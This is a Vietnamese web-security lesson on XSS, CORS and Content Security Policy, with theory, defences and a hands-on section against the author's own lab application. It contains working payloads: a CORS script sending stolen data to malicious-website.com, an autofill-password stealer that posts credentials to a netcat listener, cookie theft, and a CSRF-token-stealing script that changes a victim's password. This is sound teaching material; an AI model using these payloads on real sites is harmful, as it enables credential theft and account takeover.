# BÀI 7: LỖI WEB CƠ BẢN - XSS  

|   Người thực hiện    | Tuần |                Chủ đề                |
| :------------------: | :--: | :----------------------------------: |
| Nguyễn Cao Huy Hoàng |  2   | Ứng dụng/Web Security/Lỗi web cơ bản |

### I. LÝ THUYẾT:

#### 1)  Tìm hiểu về XSS:

- **XSS** - **Cross-site Scripting** là một lỗ hổng cho phép attacker can thiệp vào tương tác giữa người dùng và ứng dụng web (thông qua  trình duyệt), phá vỡ chính sách cùng nguồn gốc (Same Origin Policy), từ đó giả mạo victim user, thực hiện bất kỳ hành động nào và truy cập vào bất kỳ dữ liệu nào của người dùng đó. Khai thác tấn công XSS chỉ thực sự xảy ra khi nạn nhân truy cập vào trang web hoặc ứng dụng thực thi các đoạn mã độc, cho nên XSS được gọi là 2 lỗ hổng **client-side**. 

- Các kiểu **XSS**:

    \+ **Reflected XSS**: là dạng XSS đơn giản nhất, xảy ra khi ứng dụng web nhận dữ liệu từ HTTP request, thường là gửi bằng phương thức **GET**, sau đó hiển thị những dữ liệu này lên reponse trả về ngay sau request đó một cách không an toàn. Do các request dẫn đến **reflected XSS** thường dùng **GET** nên cách khai thác cũng khá đơn giản, attacker chỉ cần gửi URL chứa script độc hại (Javascript, HTML) đến ứng dụng web đó thông qua email, mạng xã hội... Khi nạn nhân click vào URL này thì script độc hại này sẽ được thực thi, attacker sẽ nhận được reponse chứa kết quả mong muốn. Ví dụ:

    `https://www.vulnweb.com/search?value=<script>alert(document.cookie)</script>`

    \+ **Stored XSS**: cũng xảy ra tương tự trong trường hợp tương tự như **reflected XSS**, nhưng thay vì chỉ hiển thị dữ liệu của nạn nhân một lần ngay trên response trả về sau khi request chứa payload được gửi đi, **stored XSS** sẽ nhắm đến  các vị trí có thể lưu lại trong database và sau đó hiển thị dữ liệu đó trên giao diện của ứng dụng web. Các vị trí đó thường là các form element trong document như comment, blog post, trang register, contact... Do đó, trong quá trình khai thác, attacker không cần phải gửi payload đến và lừa nạn nhân truy cập vào mà vẫn có thể tấn công nhiều người chỉ cần một lần script.

    ![img](https://1.bp.blogspot.com/-6byYqkwApZg/X45a2xtGY5I/AAAAAAAAABM/VuQgSTjRfYshIuNKOPPx4L-6yIyPbzbfwCLcBGAsYHQ/s16000/6.png)

    \+ **DOM-based XSS**: dạng XSS này hướng đến việc thay đổi cấu trúc DOM, cụ thể là HTML, làm thay đổi giao diện phía người dùng. Ví dụ, một ứng dụng web sử dụng Javascript để đọc giá trị từ một input field và viết giá trị đó vào một element bên trong DOM:

    ```javascript
    var search = document.getElementById('search').value;
    var results = document.getElementById('results');
    results.innerHTML = 'You searched for: ' + search;
    ```

    Nếu có thể kiểm soát giá trị của input field "search", attacker có thể dễ dàng chèn script độc hại vào field này và thực thi nó trên trang của người dùng, ví dụ như:

    `You searched for: <img src=1 onerror='/* malicious script here... */'>`.

- Các cách khai thác đề cập ở trên chỉ xảy ra với các ứng dụng web không có cơ chế nào để filter đầu vào. Để bypass các XSS filter thì chúng ta có các kĩ thuật nâng cao hơn, chi tiết tham khảo tại:

    \+ https://null-byte.wonderhowto.com/how-to/advanced-techniques-bypass-defeat-xss-filters-part-1-0190257/.

    \+ https://null-byte.wonderhowto.com/how-to/advanced-techniques-bypass-defeat-xss-filters-part-2-0190959/.

- Cách phòng tránh XSS:

    \+ **Filter input**: giới hạn input của người dùng trong danh sách cụ thể, phương pháp này đảm bảo rằng chỉ các giá trị đã biết và an toàn mới được gửi đến máy chủ. Việc hạn chế input chỉ hoạt động nếu hệ thống biết có thể nhận được loại dữ liệu nào. Tuy nhiên, nó chỉ giúp giảm thiểu rủi ro, không đảm bảo đủ để ngăn chặn lỗ hổng XSS có thể xảy ra.
    \+ **Output encoding**: tại điểm mà dữ liệu mà attacker muốn retrieve được xuất ra trong reponse, encode dữ liệu đó nhằm ngăn chặn các malious script có trong dữ liệu sẽ thực thi khi được xuất ra ở response, mà vẫn đảm bảo rằng dữ liệu vẫn được hiển thị đúng cách, tùy vào các context khác nhau. Ví dụ, trong context của HTML, ta có thể chuyển các giá trị non-whitelisted trở thành các HTML entity, như `<` trở thành `&lt;` và `>` trở thành `&gt;`.
    \+ **Config các response header**: sử dụng các header liên quan đến CORS như **Access-Control-Allow-Origin** để ngăn chặn các website khác (trong đó có trang của attacker) can thiệp vào traffic của ứng dụng web cần bảo vệ, các header quy định cách hiển thị nội dung trên response như **Content-Type** hay **X-Content-Type-Options**.
    \+ **Content Security Policy**: đây thường là lớp phòng thủ cuối cùng, nó sẽ chỉ định các domain name được nguồn hợp lệ của các script thực thi. Trình duyệt tương thích CSP sau đó sẽ chỉ thực thi các script được load trong nguồn nhận được từ các miền thuộc danh sách đó.

#### 2) Cross-Origin Resource Sharing (CORS):

- **Cross-Origin Resource Sharing** là một cơ chế cho phép một server chỉ định rằng các origins khác (xét theo 3 tiêu chí **domain**, **scheme**, **port**) ngoại trừ chính nó ra có được phép truy cập vào và sử dụng tài nguyên của nó không.

- Một ví dụ về việc sử dụng **CORS**: tại website có URL là `https://domain-a.com` có một đoạn code Javascript sử dụng [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) để gửi request đến website `https://domain-b.com/data.xml` để lấy dữ liệu trong tài nguyên **data.xml** của **domain-b** về hiển thị trên **domain-a**. Khi đó, tại **domain-b** nếu như trong response trả về không có header **Access-Control-Allow-Origin** hoặc giá trị của nó không hợp lệ thì sẽ phát sinh ra lỗi  **no 'access-control-allow-origin' header is present on the requested resource** và **domain-a** không thể lấy được dữ liệu nằm ở **data.xml** của **domain-b**. 

- **CORS** là một sự bổ sung linh hoạt cho **SOP** (Same Origin Policy), tuy nhiên nếu không được sử dụng config và sử dụng đúng cách nó có thể dẫn đến các cuộc tấn công cross-domain. Dưới đây là **kịch bản** tấn công cross-domain do config **CORS** không cẩn thận:

  \+  Một ứng dụng web có domain name là `vulnerable-website.com` nhận được request như sau:

        GET /sensitive-data HTTP/1.1
        Host: vulnerable-website.com
        Origin: https://malicious-website.com
        ...
  
     \+ Và nó trả về reponse như sau:

        HTTP/1.1 200 OK
        Access-Control-Allow-Origin: *
        ...
  
     \+ Giá trị của header **Access-Control-Allow-Origin** cho ta biết rằng `vulnerable-website.com` cho phép bất kì **process** nào đến từ bất kì **origin** nào được phép truy cập vào tài nguyên của nó, kể cả origin có URL là `https://malicious-website.com` của attacker. Nếu response chứa bất kỳ dữ liệu nhạy cảm nào như API key hay CSRF token, kẻ tấn công có thể lấy được nó bằng cách chèn script này từ website của mình (`https://malicious-website.com`):
  
  ```javascript
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
    req.send();
    
    function reqListener() {
        location='//malicious-website.com/log?key='+this.responseText;
    };                                                          
  ```
  
     \+  Website `malicious-website.com` sẽ gửi request đến `vulnerable-website.com`, bên trong request này có chứa hàm **reqListener**, hàm này sẽ thực thi khi vào được tài nguyên là **sensitive-victim-data** của `vulnerable-website.com`, đọc toàn bộ nội dung tại đó và trả về lại `malicious-website.com` thông qua GET parameter **key**.

#### 3) Content Security Policy:

- **Content Security Policy** là một reponse header cho phép admin của một website kiểm soát các tài nguyên mà user agent (thường để chỉ browser) được phép load. Từ đó ngăn chặn được các cuộc tấn công chèn script từ các origin khác như **XSS**.

- Syntax: `Content-Security-Policy: <policy-directive>; <policy-directive>`

  trong đó, `<policy-directive>` bao gồm: `<directive>` và `<value>`. Chi tiết về các directive xem tại  [đây](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy).

- Kịch bản tấn công một trang web có **Content Security Policy** yếu:

  https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/diceCTF_2_2021/Web%20Exploitation/Babier%20CSP.md.

### II. Thực Hành:

#### 1) Source code:

https://github.com/antoinenguyen-09/DVWA-From-Antoine/tree/main/XSS

#### 2) Exploit:

**a) Chiếm cookie:**

- Mỗi khi login thì trang web của chúng ta sẽ tạo ra một session cùng với một cookie tên "login". Ví dụ khi ta đăng nhập vào user **messi**:

  ![image](https://user-images.githubusercontent.com/61876488/119174179-783a2480-ba92-11eb-936d-f78f16db7b84.png)

- Vào **List of student** >> Click vào **1 ô id của 1 student bất kì** >> Chọn **Chat with this student** để gửi tin nhắn cho student đó rồi nhập payload vào:

  ![image](https://user-images.githubusercontent.com/61876488/119175870-943ec580-ba94-11eb-82dd-750631641a86.png)

​    Đồng thời ở host bên kia (có địa chỉ ip là 192.168.1.248), bật netcat để listen: 

![image](https://user-images.githubusercontent.com/61876488/119176368-39f23480-ba95-11eb-9b12-8b84e1a71173.png)

   Xong xuôi ta bấm **send** để gửi cho student có username **pique**.

- Thử đăng nhập vào user **pique** rồi bấm **View message** để xem tin nhắn của user **messi**:

  ![image](https://user-images.githubusercontent.com/61876488/119177372-6f4b5200-ba96-11eb-9149-03c3504ef5e2.png)

- Ngay lập tức từ host 192.168.1.248 ta nhận được request:

  ![image](https://user-images.githubusercontent.com/61876488/119185616-1cc36300-baa1-11eb-8988-e442a50bd368.png)

- Như vậy chúng ta đã lấy được toàn bộ cookie, test thử cookie vừa mới lấy được bằng cách thử đăng nhập vào user **messi** sau đó thay value bằng cookie login của user **pique**. Kết quả là đăng nhập thành công và chiếm mọi quyền của user **pique**.


**b)  Lấy mật khẩu nhờ tính năng tự động điền (không cần người dùng tương tác):**

- Cách khai thác và endpoint tương tự như khi khai thác chiếm cookie ở trên. Giả sử user **pique** bật tính năng tự động điền thông tin tài khoản trên browser:

  ![image](https://user-images.githubusercontent.com/61876488/119221323-ffca7680-bb18-11eb-8845-72e7d9fbc084.png)

- Khi đó user **messi** có thể vào chức năng nhắn tin và gửi cho user **pique** nội dung như sau:

  ```html
  <form>
   <input type="text" name="user">
   <input type="password" name="pass" onchange="xss(this.value)">
  </form>
  <script>
  function xss(val){
      if(val.length){
          // send request to host 192.168.1.248 which is listened by netcat
          fetch("http://192.168.1.248", {method:"POST",mode: "no-cors",body: document.getElementsByName("user")[0].value+" : "+val})
      } 
  }
  </script>
  ```

- Khi user **pique** vào xem tin nhắn thì malicious script sẽ được thực thi, cho kết quả như sau:

  ![image](https://user-images.githubusercontent.com/61876488/119221512-f988ca00-bb19-11eb-8dc0-15bfaaf2b73d.png)

**c) Bypass CSRF thông qua XSS:**

- Khi student hay teacher truy cập vào chức năng update thông tin sinh viên thì một CSRF token sẽ được sinh ra và đặt trong hidden input:

  ![image](https://user-images.githubusercontent.com/61876488/119271521-25947000-bc2c-11eb-855f-a3cb007e1239.png)

- Chúng ta có thể hoàn toàn chiếm được token này bằng cách gửi payload này cho student khác thông qua chức năng nhắn tin:

  ```html
  <script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open("get","/st_update.php",true);
  req.send();
  function handleResponse() {
      var token = this.responseText.match(/name="csrf" value="(w+)"/)[1];
      var changeReq = new XMLHttpRequest();
      changeReq.open("post", "/st_update_a.php", true);
      changeReq.send("csrf="+token+"&email=leo@barca.com&phonenum=0318370123&pass=1234567&cpass=1234567&submit=") // dùng user này để khiến user khác phải thay đổi thông tin thông qua CSRF
  };
  </script>
  ```

  

  
